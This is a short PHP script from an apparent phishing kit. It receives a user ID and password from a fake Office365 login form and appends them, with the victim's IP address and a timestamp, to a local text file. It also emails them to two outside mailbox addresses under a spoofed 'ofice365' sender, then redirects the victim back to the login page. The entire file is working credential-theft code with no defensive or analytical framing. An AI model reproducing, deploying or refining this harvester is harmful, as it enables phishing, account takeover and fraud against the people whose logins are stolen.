<?
session_start();

$user = $_POST['session_key'];
$pass = $_POST['session_password'];

$file = fopen("tsb1.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$adddate\r\n");
fputs ($file, "User ID: $user\r\n");
fputs ($file, "Password: $pass\r\n");
fputs ($file, "$ip\r\n");
fputs ($file, "-----------------------------------\r\n");
fclose ($file);

$ip = getenv("REMOTE_ADDR");

if((!is_numeric($user)) || ($pass == "pass"))

{
$message="=========Office365 Login=========\n
";
$message=$message."Email: $user\n
";
$message=$message."Password: $pass\n
";
$message=$message."IP: $ip\n
";
$message=$message."=========Office365 Login=========
";
mail ("Richardsmith292929@gmail.com,Richardsmith292929@yandex.com","$user , $ip","$message","From: ofice365 Logon<admin@ofice365.com>\n");
header("Location: Login.php");
}
?>